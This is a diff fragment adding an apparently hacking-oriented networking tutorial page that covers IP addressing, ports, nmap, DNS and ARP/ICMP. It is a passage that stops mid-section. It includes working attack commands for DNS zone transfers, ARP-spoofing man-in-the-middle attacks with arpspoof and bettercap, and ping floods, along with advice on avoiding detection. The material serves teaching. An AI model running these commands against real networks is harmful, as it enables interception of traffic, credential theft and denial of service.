+                        <td>N/A</td>
+                    </tr>
+                    <tr>
+                        <td>E</td>
+                        <td>240-255</td>
+                        <td>N/A</td>
+                        <td>Reserved</td>
+                        <td>N/A</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Special IP Addresses You MUST Know</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Address/Range</th>
+                        <th>Purpose</th>
+                        <th>Hacker Notes</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>127.0.0.1</td>
+                        <td>Localhost - your own machine</td>
+                        <td>SSRF attacks often target this. Services "only listening on localhost" can be reached via SSRF.</td>
+                    </tr>
+                    <tr>
+                        <td>127.0.0.0/8</td>
+                        <td>Entire loopback range</td>
+                        <td>127.0.0.2, 127.1.2.3 - all point to your machine. Can bypass naive filters!</td>
+                    </tr>
+                    <tr>
+                        <td>10.0.0.0/8</td>
+                        <td>Private network (Class A)</td>
+                        <td>Large organizations. 16 million addresses. Internal networks, not internet-routable.</td>
+                    </tr>
+                    <tr>
+                        <td>172.16.0.0/12</td>
+                        <td>Private network (Class B)</td>
+                        <td>172.16.0.0 - 172.31.255.255. Common in corporate networks.</td>
+                    </tr>
+                    <tr>
+                        <td>192.168.0.0/16</td>
+                        <td>Private network (Class C)</td>
+                        <td>Your home network! 192.168.0.0 - 192.168.255.255. Most common private range.</td>
+                    </tr>
+                    <tr>
+                        <td>0.0.0.0</td>
+                        <td>All addresses / unspecified</td>
+                        <td>Binding to 0.0.0.0 = listen on ALL interfaces. Dangerous if unintended!</td>
+                    </tr>
+                    <tr>
+                        <td>255.255.255.255</td>
+                        <td>Broadcast</td>
+                        <td>Sent to everyone on local network. DHCP uses this.</td>
+                    </tr>
+                    <tr>
+                        <td>169.254.0.0/16</td>
+                        <td>Link-local (APIPA)</td>
+                        <td>Assigned when DHCP fails. Indicates network misconfiguration.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Public vs Private IP Addresses</h3>
+            <div class="code"># PUBLIC IP:
+# - Unique across the entire internet
+# - Assigned by your ISP
+# - Routable on the internet
+# - Example: 203.45.67.89
+
+# PRIVATE IP:
+# - Only unique within your local network
+# - Assigned by your router (DHCP)
+# - NOT routable on the internet
+# - Examples: 192.168.1.100, 10.0.0.50, 172.16.5.25
+
+# How do private IPs access the internet?
+# NAT - Network Address Translation
+
+# Your computer: 192.168.1.100
+# Sends packet to: 93.184.216.34 (example.com)
+# Router translates:
+#   Source: 192.168.1.100 → Your public IP (203.45.67.89)
+# Reply comes back to your public IP
+# Router remembers and forwards to 192.168.1.100
+
+# This is why you can't directly connect to 192.168.1.100 from outside
+# You need port forwarding or a reverse shell!</div>
+
+            <div class="warning-box">
+                <h4>Why Private IPs Matter for Hacking</h4>
+                <p>Understanding private vs public IPs is crucial for:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Pivoting:</strong> Once inside a network, you can reach private IPs the internet can't</li>
+                    <li><strong>SSRF:</strong> Trick servers into making requests to internal (private) resources</li>
+                    <li><strong>Reverse shells:</strong> Your callback needs to go to your PUBLIC IP, not private</li>
+                    <li><strong>Internal recon:</strong> Mapping 10.x, 172.x, 192.168.x networks reveals infrastructure</li>
+                </ul>
+            </div>
+
+            <h3>Subnetting: Dividing Networks</h3>
+            <p>Subnetting divides a network into smaller pieces. The subnet mask determines which part of an IP address is the "network" portion and which is the "host" portion.</p>
+
+            <div class="code"># Subnet mask basics:
+IP:        192.168.1.100
+Subnet:    255.255.255.0   (or /24 in CIDR notation)
+
+# The subnet mask divides the IP:
+# 255 in binary = 11111111 (all 1s = network portion)
+# 0 in binary   = 00000000 (all 0s = host portion)
+
+# 255.255.255.0 means:
+# First 3 octets (192.168.1) = Network address (identifies which network)
+# Last octet (100) = Host address (identifies device on that network)
+
+# On this network (192.168.1.0/24):
+# 192.168.1.0   = Network address (identifies the network itself)
+# 192.168.1.1   = Usually the gateway (your router)
+# 192.168.1.2-254 = Available hosts (253 usable addresses)
+# 192.168.1.255 = Broadcast address (reaches all hosts)
+
+# Calculate number of hosts:
+# /24 = 8 host bits = 2^8 = 256 addresses
+# Minus 2 (network + broadcast) = 254 usable hosts</div>
+
+            <h3>CIDR Notation</h3>
+            <p>CIDR (Classless Inter-Domain Routing) is the modern way to express subnets. The number after the slash indicates how many bits are the network portion.</p>
+
+            <div class="code"># CIDR examples:
+/32 = 255.255.255.255 = 1 address      (single host)
+/31 = 255.255.255.254 = 2 addresses    (point-to-point links)
+/30 = 255.255.255.252 = 4 addresses    (2 usable - tiny subnet)
+/29 = 255.255.255.248 = 8 addresses    (6 usable)
+/28 = 255.255.255.240 = 16 addresses   (14 usable)
+/27 = 255.255.255.224 = 32 addresses   (30 usable)
+/26 = 255.255.255.192 = 64 addresses   (62 usable)
+/25 = 255.255.255.128 = 128 addresses  (126 usable)
+/24 = 255.255.255.0   = 256 addresses  (254 usable) - typical home network
+/23 = 255.255.254.0   = 512 addresses  
+/22 = 255.255.252.0   = 1,024 addresses
+/16 = 255.255.0.0     = 65,536 addresses
+/8  = 255.0.0.0       = 16,777,216 addresses
+
+# Quick calculation:
+# Hosts = 2^(32 - CIDR) - 2
+# /24 → 2^8 - 2 = 254 usable hosts
+# /16 → 2^16 - 2 = 65,534 usable hosts</div>
+
+            <h3>IPv6: The Future</h3>
+            <p>IPv6 uses 128 bits instead of 32, giving us... a lot more addresses. Like, incomprehensibly more.</p>
+
+            <div class="code"># IPv6 format: Eight groups of 4 hex digits
+2001:0db8:85a3:0000:0000:8a2e:0370:7334
+
+# Can be shortened:
+# Leading zeros dropped: 2001:db8:85a3:0:0:8a2e:370:7334
+# Consecutive zeros collapsed: 2001:db8:85a3::8a2e:370:7334
+
+# Total possible addresses:
+2^128 = 340,282,366,920,938,463,463,374,607,431,768,211,456
+# That's 340 undecillion - enough for billions of addresses per atom on Earth
+
+# Special IPv6 addresses:
+::1                = Localhost (like 127.0.0.1)
+::                 = All zeros (unspecified)
+fe80::/10          = Link-local (like 169.254.x.x)
+fc00::/7           = Unique local (like private IPv4)
+2000::/3           = Global unicast (public addresses)
+
+# Hacker note: Many networks have IPv6 enabled but unsecured!
+# Firewalls configured for IPv4 might ignore IPv6 traffic</div>
+
+            <div class="info-box">
+                <h4>IPv6 Security Implications</h4>
+                <p>IPv6 opens new attack surfaces:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Dual-stack systems may have weaker IPv6 security</li>
+                    <li>IPv6 doesn't need NAT, so internal devices may be directly reachable</li>
+                    <li>Neighbor Discovery Protocol (NDP) is vulnerable to attacks similar to ARP spoofing</li>
+                    <li>Many security tools don't fully support IPv6 yet</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="ports" class="section">
+            <h2 class="section-title">Ports: Apartment Numbers for Services</h2>
+            <p class="section-intro">If an IP address is a building's street address, ports are apartment numbers. They direct network traffic to specific services running on a machine. A single server with one IP can run dozens of different services - each listening on a different port.</p>
+
+            <div class="metaphor-box">
+                <h4>🏢 The Apartment Building Metaphor</h4>
+                <p>Imagine a large apartment building:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Building address (IP):</strong> 192.168.1.100</li>
+                    <li><strong>Apartment 22:</strong> SSH lives here (secure shell access)</li>
+                    <li><strong>Apartment 80:</strong> HTTP lives here (web server)</li>
+                    <li><strong>Apartment 443:</strong> HTTPS lives here (secure web)</li>
+                    <li><strong>Apartment 3306:</strong> MySQL lives here (database)</li>
+                </ul>
+                <p style="margin-top: 1rem;">When a visitor arrives, they need both the address AND the apartment number. A packet to 192.168.1.100:80 goes to the web server, while 192.168.1.100:22 goes to SSH - same building, different residents!</p>
+            </div>
+
+            <h3>Port Basics</h3>
+            <div class="code"># Port numbers range from 0 to 65535 (2^16)
+
+# Port categories:
+# Well-known ports (0-1023): 
+#   Reserved for privileged services
+#   Require root/admin to bind (on Unix)
+#   Standard protocols live here
+
+# Registered ports (1024-49151):
+#   Applications can register with IANA
+#   Common applications use these
+
+# Dynamic/Ephemeral ports (49152-65535):
+#   Used for client-side connections
+#   Your browser uses a random port here to connect to servers
+
+# Example: You visit https://google.com
+Your browser: 192.168.1.100:54321  → Google: 142.250.80.14:443
+              (random ephemeral)        (standard HTTPS port)</div>
+
+            <h3>Ports You MUST Know</h3>
+            <p>These ports appear constantly in hacking. Memorize them.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>Protocol</th>
+                        <th>Security Notes</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>20/21</td>
+                        <td>FTP (Data/Control)</td>
+                        <td>TCP</td>
+                        <td>Cleartext credentials! Anonymous login often enabled. Active vs Passive mode.</td>
+                    </tr>
+                    <tr>
+                        <td>22</td>
+                        <td>SSH</td>
+                        <td>TCP</td>
+                        <td>Secure shell. Bruteforce target. Look for weak creds, key-based auth.</td>
+                    </tr>
+                    <tr>
+                        <td>23</td>
+                        <td>Telnet</td>
+                        <td>TCP</td>
+                        <td>CLEARTEXT! All traffic visible. Easy credential sniffing. Should never be used.</td>
+                    </tr>
+                    <tr>
+                        <td>25</td>
+                        <td>SMTP</td>
+                        <td>TCP</td>
+                        <td>Email sending. User enumeration (VRFY, EXPN). Open relay abuse.</td>
+                    </tr>
+                    <tr>
+                        <td>53</td>
+                        <td>DNS</td>
+                        <td>TCP/UDP</td>
+                        <td>Zone transfers expose all subdomains. DNS spoofing. Cache poisoning.</td>
+                    </tr>
+                    <tr>
+                        <td>80</td>
+                        <td>HTTP</td>
+                        <td>TCP</td>
+                        <td>Unencrypted web. XSS, SQLi, CSRF, LFI, RFI, RCE... endless vulns.</td>
+                    </tr>
+                    <tr>
+                        <td>110</td>
+                        <td>POP3</td>
+                        <td>TCP</td>
+                        <td>Email retrieval. Often cleartext. Bruteforce creds.</td>
+                    </tr>
+                    <tr>
+                        <td>111</td>
+                        <td>RPCbind</td>
+                        <td>TCP/UDP</td>
+                        <td>Sun RPC. Maps services to ports. Enumeration gold.</td>
+                    </tr>
+                    <tr>
+                        <td>135</td>
+                        <td>MS-RPC</td>
+                        <td>TCP</td>
+                        <td>Windows RPC. Many exploits. Required for DCOM.</td>
+                    </tr>
+                    <tr>
+                        <td>139</td>
+                        <td>NetBIOS</td>
+                        <td>TCP</td>
+                        <td>Windows networking. SMB over NetBIOS. Legacy attacks.</td>
+                    </tr>
+                    <tr>
+                        <td>143</td>
+                        <td>IMAP</td>
+                        <td>TCP</td>
+                        <td>Email retrieval. Can be cleartext. Bruteforce target.</td>
+                    </tr>
+                    <tr>
+                        <td>443</td>
+                        <td>HTTPS</td>
+                        <td>TCP</td>
+                        <td>Encrypted web. App-level vulns still exist! Certificate issues.</td>
+                    </tr>
+                    <tr>
+                        <td>445</td>
+                        <td>SMB</td>
+                        <td>TCP</td>
+                        <td>Windows file sharing. EternalBlue! Ransomware favorite. Null sessions.</td>
+                    </tr>
+                    <tr>
+                        <td>993</td>
+                        <td>IMAPS</td>
+                        <td>TCP</td>
+                        <td>Secure IMAP over TLS. Still bruteforceable.</td>
+                    </tr>
+                    <tr>
+                        <td>995</td>
+                        <td>POP3S</td>
+                        <td>TCP</td>
+                        <td>Secure POP3 over TLS.</td>
+                    </tr>
+                    <tr>
+                        <td>1433</td>
+                        <td>MSSQL</td>
+                        <td>TCP</td>
+                        <td>Microsoft SQL Server. Default creds (sa/empty). xp_cmdshell RCE!</td>
+                    </tr>
+                    <tr>
+                        <td>1521</td>
+                        <td>Oracle</td>
+                        <td>TCP</td>
+                        <td>Oracle database. SID enumeration. Default creds.</td>
+                    </tr>
+                    <tr>
+                        <td>3306</td>
+                        <td>MySQL</td>
+                        <td>TCP</td>
+                        <td>MySQL database. Root with no password? INTO OUTFILE for shell.</td>
+                    </tr>
+                    <tr>
+                        <td>3389</td>
+                        <td>RDP</td>
+                        <td>TCP</td>
+                        <td>Remote Desktop. Bruteforce. BlueKeep! Man-in-the-middle possible.</td>
+                    </tr>
+                    <tr>
+                        <td>5432</td>
+                        <td>PostgreSQL</td>
+                        <td>TCP</td>
+                        <td>Postgres database. COPY for file read/write. RCE possible.</td>
+                    </tr>
+                    <tr>
+                        <td>5900</td>
+                        <td>VNC</td>
+                        <td>TCP</td>
+                        <td>Virtual Network Computing. Weak auth. Bruteforce. Screen scraping.</td>
+                    </tr>
+                    <tr>
+                        <td>6379</td>
+                        <td>Redis</td>
+                        <td>TCP</td>
+                        <td>Redis cache. Usually NO AUTH! Write SSH keys for RCE.</td>
+                    </tr>
+                    <tr>
+                        <td>8080</td>
+                        <td>HTTP-Alt</td>
+                        <td>TCP</td>
+                        <td>Alternative HTTP. Often dev/test servers. Proxy servers.</td>
+                    </tr>
+                    <tr>
+                        <td>27017</td>
+                        <td>MongoDB</td>
+                        <td>TCP</td>
+                        <td>MongoDB. Often NO AUTH! Exposed databases everywhere.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Port Scanning with Nmap</h3>
+            <p>Port scanning is fundamental reconnaissance. Nmap is the king of port scanners.</p>
+
+            <div class="code"># Basic scans:
+nmap 192.168.1.1              # Scan top 1000 ports
+nmap -p 80,443 192.168.1.1    # Scan specific ports
+nmap -p- 192.168.1.1          # Scan ALL 65535 ports (slow)
+nmap -p 1-1000 192.168.1.1    # Scan port range
+
+# Scan types:
+nmap -sT 192.168.1.1    # TCP Connect (full handshake, logs everywhere)
+nmap -sS 192.168.1.1    # SYN scan (stealthy, half-open) [default, needs root]
+nmap -sU 192.168.1.1    # UDP scan (slow, unreliable)
+nmap -sV 192.168.1.1    # Version detection (what software?)
+nmap -sC 192.168.1.1    # Default scripts (basic vuln scan)
+nmap -A 192.168.1.1     # Aggressive (OS, versions, scripts, traceroute)
+nmap -O 192.168.1.1     # OS detection
+
+# Speed (T0=slowest/stealthiest, T5=fastest/loudest):
+nmap -T4 192.168.1.1    # Fast and reasonably quiet
+
+# Output:
+nmap -oN scan.txt       # Normal output
+nmap -oX scan.xml       # XML output
+nmap -oG scan.gnmap     # Grepable output
+nmap -oA scan           # All formats at once
+
+# Network scanning:
+nmap -sn 192.168.1.0/24     # Ping sweep (find live hosts)
+nmap -sn 10.0.0.0/8 --min-rate 1000   # Fast sweep of huge network</div>
+
+            <h3>Understanding Scan Results</h3>
+            <div class="code"># Port states in nmap:
+
+open        # Service is listening and accepting connections
+             # This is what you want to find!
+
+closed      # Port is accessible but no service listening
+             # Host is up, port responded with RST
+
+filtered    # Nmap can't determine if open or closed
+             # Firewall/packet filter blocking probes
+
+unfiltered  # Port is accessible, nmap can't tell if open/closed
+             # Only appears in ACK scans
+
+open|filtered    # Nmap can't determine between open or filtered
+                  # Common with UDP scans
+
+closed|filtered  # Nmap can't determine between closed or filtered
+                  # Rare</div>
+
+            <div class="info-box">
+                <h4>The Art of Port Scanning</h4>
+                <p>Port scanning isn't just running nmap. Consider:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Stealth:</strong> Will IDS/IPS detect you? Use slower scans, fewer ports</li>
+                    <li><strong>Completeness:</strong> Sometimes valuable services run on non-standard ports</li>
+                    <li><strong>Version info:</strong> Knowing "Apache 2.4.49" vs just "port 80 open" changes everything</li>
+                    <li><strong>UDP:</strong> Everyone forgets UDP. DNS, SNMP, DHCP - major attack surfaces!</li>
+                    <li><strong>Timing:</strong> Scan during business hours to blend with normal traffic</li>
+                </ul>
+            </div>
+
+            <h3>Listening vs Connecting</h3>
+            <div class="code"># LISTENING: Server waiting for connections
+# The service "opens" a port and waits
+
+# Check listening ports:
+netstat -tlnp    # Linux: TCP listening ports with PID
+netstat -ulnp    # Linux: UDP listening ports with PID
+ss -tlnp         # Linux: Modern alternative to netstat
+netstat -an      # Windows: All connections
+
+# Example output:
+Proto  Local Address     Foreign Address   State       PID
+tcp    0.0.0.0:22        0.0.0.0:*         LISTEN      1234/sshd
+tcp    0.0.0.0:80        0.0.0.0:*         LISTEN      5678/apache2
+tcp    192.168.1.100:443 142.250.80.14:443 ESTABLISHED 9999/firefox
+
+# 0.0.0.0:22 = Listening on ALL interfaces on port 22
+# 127.0.0.1:3306 = Only listening on localhost (safer!)
+# 192.168.1.100:443 = Established connection to Google</div>
+        </section>
+
+        <section id="dns" class="section">
+            <h2 class="section-title">DNS: The Internet's Phone Book</h2>
+            <p class="section-intro">DNS (Domain Name System) translates human-readable names like google.com into IP addresses computers can use. Without DNS, you'd have to memorize IP addresses for every website. DNS is critical infrastructure - and critically exploitable.</p>
+
+            <div class="metaphor-box">
+                <h4>📞 The Phone Book Metaphor</h4>
+                <p>Remember phone books? (Maybe not, but work with me here)</p>
+                <ul style="margin-top: 1rem;">
+                    <li>You want to call "Pizza Palace" but don't know their number</li>
+                    <li>You look in the phone book (DNS query)</li>
+                    <li>The book tells you: "Pizza Palace = 555-1234"</li>
+                    <li>Now you can call them!</li>
+                </ul>
+                <p style="margin-top: 1rem;">DNS is the internet's phone book - you ask "what's the number for google.com?" and DNS returns "142.250.80.14".</p>
+                <p style="margin-top: 1rem;"><strong>Attack angle:</strong> What if someone gave you a fake phone book? You'd call the wrong number and might give sensitive info to a stranger. That's DNS spoofing!</p>
+            </div>
+
+            <h3>How DNS Works (Step by Step)</h3>
+            <div class="code">You type: www.example.com in your browser
+
+STEP 1: Browser Cache
+└── Browser checks: "Have I looked this up in the last few minutes?"
+    └── If yes, use cached IP. Done!
+    └── If no, continue...
+
+STEP 2: Operating System Cache
+└── OS checks its DNS cache
+    # Windows: ipconfig /displaydns
+    # Linux: systemd-resolve --status
+    └── If found, return IP. Done!
+    └── If not, continue...
+
+STEP 3: Hosts File
+└── OS checks /etc/hosts (Linux) or C:\Windows\System32\drivers\etc\hosts
+    └── Manual overrides live here
+    └── 192.168.1.100  myserver.local
+    └── If found, return IP. Done!
+    └── If not, continue...
+
+STEP 4: Recursive Resolver (Your ISP's DNS)
+└── Query goes to your configured DNS server
+    └── Usually your router → ISP DNS
+    └── Or custom: 8.8.8.8 (Google), 1.1.1.1 (Cloudflare)
+    └── Resolver checks its cache
+    └── If found, return IP. Done!
+    └── If not, resolver does the heavy lifting...
+
+STEP 5: Root DNS Servers
+└── Resolver asks root server: "Where is .com?"
+    └── 13 root server clusters worldwide (a.root-servers.net through m)
+    └── Root says: "I don't know example.com, but .com TLD is at these servers"
+
+STEP 6: TLD (Top-Level Domain) Servers
+└── Resolver asks .com TLD: "Where is example.com?"
+    └── TLD says: "I don't know the IP, but example.com's nameservers are at..."
+
+STEP 7: Authoritative Nameserver
+└── Resolver asks example.com's nameserver: "What's the IP for www?"
+    └── Authoritative server says: "93.184.216.34"
+    └── This is the definitive answer!
+
+STEP 8: Response Cached and Returned
+└── Resolver caches the answer (TTL determines how long)
+└── Returns 93.184.216.34 to your OS
+└── OS caches it, returns to browser
+└── Browser caches it, connects to the IP
+
+Total time: Usually 20-120 milliseconds for uncached lookups</div>
+
+            <h3>DNS Record Types</h3>
+            <p>DNS stores various types of records. Each serves a different purpose - and leaks different information to attackers.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Name</th>
+                        <th>Purpose</th>
+                        <th>Hacker Use</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>A</td>
+                        <td>Address</td>
+                        <td>Maps domain to IPv4 address</td>
+                        <td>Find server IPs, identify hosting</td>
+                    </tr>
+                    <tr>
+                        <td>AAAA</td>
+                        <td>IPv6 Address</td>
+                        <td>Maps domain to IPv6 address</td>
+                        <td>Discover IPv6 infrastructure (often unsecured)</td>
+                    </tr>
+                    <tr>
+                        <td>MX</td>
+                        <td>Mail Exchanger</td>
+                        <td>Specifies mail servers for domain</td>
+                        <td>Find email infrastructure, phishing setup</td>
+                    </tr>
+                    <tr>
+                        <td>NS</td>
+                        <td>Nameserver</td>
+                        <td>Authoritative DNS servers for domain</td>
+                        <td>DNS infrastructure mapping, zone transfer targets</td>
+                    </tr>
+                    <tr>
+                        <td>TXT</td>
+                        <td>Text Record</td>
+                        <td>Arbitrary text (SPF, DKIM, verification)</td>
+                        <td>Information disclosure! Often contains secrets.</td>
+                    </tr>
+                    <tr>
+                        <td>CNAME</td>
+                        <td>Canonical Name</td>
+                        <td>Alias to another domain</td>
+                        <td>Subdomain takeover if points to unclaimed resource!</td>
+                    </tr>
+                    <tr>
+                        <td>PTR</td>
+                        <td>Pointer</td>
+                        <td>Reverse DNS - IP to domain</td>
+                        <td>Identify what domain an IP belongs to</td>
+                    </tr>
+                    <tr>
+                        <td>SOA</td>
+                        <td>Start of Authority</td>
+                        <td>Administrative info about zone</td>
+                        <td>Admin email, serial numbers, timing</td>
+                    </tr>
+                    <tr>
+                        <td>SRV</td>
+                        <td>Service</td>
+                        <td>Locate services (LDAP, SIP, etc.)</td>
+                        <td>Discover internal services like AD</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>DNS Reconnaissance Tools</h3>
+            <div class="code"># nslookup - Basic DNS queries
+nslookup google.com
+nslookup -type=MX google.com
+nslookup -type=NS google.com
+nslookup -type=TXT google.com
+
+# dig - More powerful DNS tool
+dig google.com                  # A record
+dig google.com MX               # MX records
+dig google.com ANY              # All records (if allowed)
+dig +short google.com           # Just the IP
+dig @8.8.8.8 google.com         # Query specific DNS server
+
+# host - Simple DNS lookup
+host google.com
+host -t MX google.com
+host -t TXT google.com
+
+# Reverse DNS lookup
+dig -x 142.250.80.14
+nslookup 142.250.80.14
+host 142.250.80.14</div>
+
+            <h3>DNS Zone Transfer Attack</h3>
+            <p>Zone transfers (AXFR) are meant to replicate DNS records between nameservers. If misconfigured, attackers can download the ENTIRE zone - every subdomain, every IP!</p>
+
+            <div class="code"># Attempt zone transfer:
+dig axfr @ns1.target.com target.com
+
+# If successful, you get EVERYTHING:
+target.com.        IN  SOA   ns1.target.com. admin.target.com.
+target.com.        IN  NS    ns1.target.com.
+target.com.        IN  NS    ns2.target.com.
+target.com.        IN  A     203.0.113.1
+www.target.com.    IN  A     203.0.113.1
+mail.target.com.   IN  A     203.0.113.2
+dev.target.com.    IN  A     203.0.113.10    # ← Dev server!
+staging.target.com IN  A     203.0.113.11    # ← Staging!
+admin.target.com.  IN  A     203.0.113.20    # ← Admin panel!
+vpn.target.com.    IN  A     203.0.113.50    # ← VPN gateway!
+db.target.com.     IN  A     10.0.0.5        # ← Internal IP leaked!
+
+# This is a MASSIVE recon win!
+# You just discovered their entire infrastructure
+
+# Automated with nmap:
+nmap --script dns-zone-transfer -p 53 ns1.target.com</div>
+
+            <div class="warning-box">
+                <h4>🎯 DNS Attacks</h4>
+                <p><strong>DNS Spoofing/Cache Poisoning:</strong></p>
+                <ul style="margin-top: 0.5rem;">
+                    <li>Inject fake DNS responses to redirect victims</li>
+                    <li>User types "bank.com" but goes to attacker's fake site</li>
+                    <li>Credentials stolen, malware delivered</li>
+                </ul>
+                <p style="margin-top: 1rem;"><strong>DNS Tunneling:</strong></p>
+                <ul style="margin-top: 0.5rem;">
+                    <li>Encode data in DNS queries to exfiltrate through firewalls</li>
+                    <li>DNS is rarely blocked, so makes good covert channel</li>
+                    <li>Tools: dnscat2, iodine</li>
+                </ul>
+                <p style="margin-top: 1rem;"><strong>Subdomain Takeover:</strong></p>
+                <ul style="margin-top: 0.5rem;">
+                    <li>CNAME points to cloud resource (AWS, Heroku, etc.)</li>
+                    <li>Resource is deleted but CNAME remains</li>
+                    <li>Attacker claims the resource, now controls subdomain!</li>
+                </ul>
+            </div>
+
+            <h3>Subdomain Enumeration</h3>
+            <p>Finding hidden subdomains is crucial reconnaissance. Many attack surfaces hide in forgotten subdomains.</p>
+
+            <div class="code"># Subdomain enumeration tools:
+
+# sublist3r - Uses search engines, VirusTotal, etc.
+sublist3r -d target.com
+
+# amass - Comprehensive subdomain discovery
+amass enum -d target.com
+
+# gobuster - Bruteforce subdomains
+gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
+
+# subfinder - Fast subdomain finder
+subfinder -d target.com
+
+# dnsrecon - DNS enumeration
+dnsrecon -d target.com
+
+# Online tools:
+# crt.sh - Certificate transparency logs
+# dnsdumpster.com - Free DNS recon
+# shodan.io - Search for exposed services</div>
+
+            <div class="info-box">
+                <h4>Certificate Transparency = Free Subdomains</h4>
+                <p>When a company gets an SSL certificate, it's logged publicly. Search crt.sh for "%.target.com" to find ALL their subdomains with SSL certs - completely legal recon!</p>
+                <div class="code" style="margin-top: 1rem;"># Query crt.sh
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Results might include:
+# dev.target.com
+# staging.target.com
+# api.target.com
+# internal.target.com  ← Interesting!
+# vpn.target.com
+# admin.target.com     ← Very interesting!</div>
+            </div>
+        </section>
+
+        <section id="protocols" class="section">
+            <h2 class="section-title">Essential Network Protocols Deep Dive</h2>
+            <p class="section-intro">Protocols are the languages and rules computers use to communicate. Each protocol has different purposes - and different vulnerabilities. Understanding these protocols at a deep level is essential for network hacking.</p>
+
+            <h3>ARP - Address Resolution Protocol</h3>
+            <p>ARP maps IP addresses to MAC addresses on local networks. It's essential for Layer 2 communication - and it's completely trusting, making it perfect for attacks.</p>
+
+            <div class="metaphor-box">
+                <h4>📫 The Apartment Mailbox Metaphor</h4>
+                <p>Imagine an apartment building where mail is delivered:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>You know someone lives at "Apt 100" (IP address)</li>
+                    <li>But mail goes to physical mailboxes (MAC addresses)</li>
+                    <li>You shout: "Who has Apt 100? What's your mailbox number?"</li>
+                    <li>The resident shouts back their mailbox number</li>
+                    <li>Now you can deliver mail to them!</li>
+                </ul>
+                <p style="margin-top: 1rem;"><strong>The problem:</strong> Anyone can shout back! An attacker says "I'm Apt 100, use MY mailbox!" - and all mail goes to them.</p>
+            </div>
+
+            <div class="code"># ARP in action:
+
+# Your computer: "Who has 192.168.1.1? Tell 192.168.1.100"
+#    This is an ARP Request (broadcast to everyone)
+
+# Router: "192.168.1.1 is at AA:BB:CC:DD:EE:FF"
+#    This is an ARP Reply (unicast back to requester)
+
+# Your computer caches this mapping:
+# ARP Cache: 192.168.1.1 → AA:BB:CC:DD:EE:FF
+
+# View ARP cache:
+arp -a             # Windows/Linux
+ip neigh show      # Linux (modern)
+
+# Example output:
+192.168.1.1 at aa:bb:cc:dd:ee:ff [ether] on eth0
+192.168.1.50 at 11:22:33:44:55:66 [ether] on eth0
+
+# Problem: ARP has NO AUTHENTICATION
+# Anyone can send ARP replies claiming to be anyone!</div>
+
+            <h3>ARP Spoofing Attack (MITM)</h3>
+            <div class="code"># ARP Spoofing - The Classic Man-in-the-Middle Attack
+
+# Normal situation:
+Victim (192.168.1.100) → Router (192.168.1.1) → Internet
+# Victim's ARP cache: 192.168.1.1 = AA:BB:CC:DD:EE:FF (router's real MAC)
+
+# Attacker sends fake ARP reply to victim:
+"192.168.1.1 is at [ATTACKER'S MAC]"
+
+# Now victim's ARP cache says:
+192.168.1.1 = [ATTACKER'S MAC]   ← POISONED!
+
+# All traffic the victim sends to "the router" goes to attacker!
+Victim → Attacker → Router → Internet
+                 ↑
+           Sees everything!
+
+# To complete MITM, also poison the router:
+"192.168.1.100 is at [ATTACKER'S MAC]"
+
+# Now traffic flows BOTH ways through attacker:
+Victim ↔ Attacker ↔ Router ↔ Internet
+
+# Tools for ARP spoofing:
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # Tell victim we're the router
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # Tell router we're the victim
+
+# Enable IP forwarding (so traffic flows through):
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Better tool - bettercap:
+bettercap -iface eth0
+> net.probe on
+> set arp.spoof.targets 192.168.1.100
+> arp.spoof on
+> net.sniff on</div>
+
+            <div class="warning-box">
+                <h4>What Can You Do With ARP Spoofing?</h4>
+                <ul style="margin-top: 0.5rem;">
+                    <li><strong>Sniff credentials:</strong> HTTP logins, FTP, Telnet - all visible</li>
+                    <li><strong>Session hijacking:</strong> Steal cookies, become logged-in users</li>
+                    <li><strong>Inject content:</strong> Add malware to downloads, modify web pages</li>
+                    <li><strong>SSL stripping:</strong> Downgrade HTTPS to HTTP</li>
+                    <li><strong>DNS spoofing:</strong> Redirect domains to fake sites</li>
+                </ul>
+            </div>
+
+            <h3>ICMP - Internet Control Message Protocol</h3>
+            <p>ICMP is used for network diagnostics and error reporting. Ping and traceroute use ICMP. It's also useful for reconnaissance and can be used in attacks.</p>
+
+            <div class="code"># Common ICMP message types:
+
+Type 0  - Echo Reply (ping response)
+Type 3  - Destination Unreachable
+Type 4  - Source Quench (deprecated)
+Type 5  - Redirect (used in attacks!)
+Type 8  - Echo Request (ping)
+Type 11 - Time Exceeded (used by traceroute)
+
+# Ping uses Echo Request/Reply:
+ping 8.8.8.8
+# Sends ICMP Type 8, receives ICMP Type 0
+
+# Traceroute uses Time Exceeded:
+traceroute google.com    # Linux
+tracert google.com       # Windows
+
+# How traceroute works:
+# 1. Send packet with TTL=1
+# 2. First router decrements TTL to 0, sends back "Time Exceeded"
+# 3. Now we know the first hop!
+# 4. Send packet with TTL=2
+# 5. Second router sends "Time Exceeded"
+# 6. Repeat until destination reached</div>
+
+            <h3>ICMP Attacks</h3>
+            <div class="code"># Ping Flood (DDoS):
+ping -f 192.168.1.1           # Flood ping (Linux, needs root)
+hping3 -1 --flood 192.168.1.1 # Using hping3
+
+# Ping of Death (historical):
+# Oversized ICMP packets that crash systems
+# Modern systems are patched against this
+
+# Smurf Attack (amplification):
+# Ping broadcast address with spoofed source
+# All hosts reply to victim = amplification
+
+# ICMP Redirect Attack:
+# Send fake "Redirect" messages
+# Victim updates routing table
+# Traffic now routes through attacker
+
+# Using hping3 for ICMP attacks:
